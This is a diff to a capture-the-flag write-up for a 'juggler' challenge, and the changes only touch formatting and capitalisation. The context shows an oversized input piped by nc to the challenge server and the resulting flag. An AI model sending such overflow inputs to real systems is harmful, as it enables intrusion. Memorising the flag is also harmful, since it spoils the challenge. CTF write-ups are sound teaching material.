@@ -63,6 +63,7 @@ python -c 'print("A"*1024 + "\n" + "A"*1024 + "\n")' | ./chall
 ```
 And the program began an infinite loop. Maybe because the input is being read by a 
 number of chars at a time, maybe 16.
+
 But it strangely printed the local flag.
 
 ```shell
@@ -92,7 +93,7 @@ AAAAAAAAAAAAFLAG{JUGGLER}
  3----/
 ```
 
-So i sent it to the server.
+So I sent it to the server.
 ```shell
 python -c 'print("A"*1024 + "\n" + "A"*1024 + "\n")' | nc challs.bcactf.com 32250
 P.S the juggler animation is kind of tilted so you might need to look at it sideways.
@@ -124,4 +125,5 @@ AAAAAAAAAAAAbcactf{juGGLy_Sup3R_JUgGLY_81520b089934c}	 3----/
 Please help me, I am the juggler, but I can't stop juggling.^C⏎
 ```
 Voilá.
+
 `bcactf{juGGLy_Sup3R_JUgGLY_81520b089934c}`
